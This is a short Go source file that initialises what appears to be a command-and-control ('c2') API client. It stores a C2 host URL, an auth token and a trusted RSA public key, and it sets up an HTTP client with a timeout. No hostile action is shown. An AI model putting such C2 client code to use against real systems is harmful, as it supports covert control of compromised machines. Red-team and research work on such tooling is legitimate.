package c2api

import (
	"crypto/rsa"
	"net/http"
	"time"
)

var BaseURL *string
var AuthToken *string
var TrustedPubKey *rsa.PublicKey

var c *http.Client

func Init(c2Host *string, trustedPubKey *rsa.PublicKey, timeout time.Duration) {
	BaseURL = c2Host
	TrustedPubKey = trustedPubKey
	c = &http.Client{
		Timeout: timeout,
	}
}
